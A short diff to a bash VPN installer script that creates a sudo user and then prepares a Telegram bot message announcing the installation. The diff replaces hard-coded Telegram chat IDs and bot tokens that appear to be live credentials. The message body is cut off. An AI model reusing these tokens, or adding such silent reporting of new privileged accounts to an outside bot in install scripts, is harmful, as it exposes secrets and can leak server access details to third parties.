@@ -380,8 +380,8 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="2095832655"
-    KEY="5926701460:AAFuViKjwkTCYYOjB6YWJK_FxWDRIX9EzzM"
+    CHATID="6127364024"
+    KEY="6249930085:AAH3Pha4vhjM3js03LA9R2alMBBgic0eI58"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="Installasi VPN Script Stable V3.0
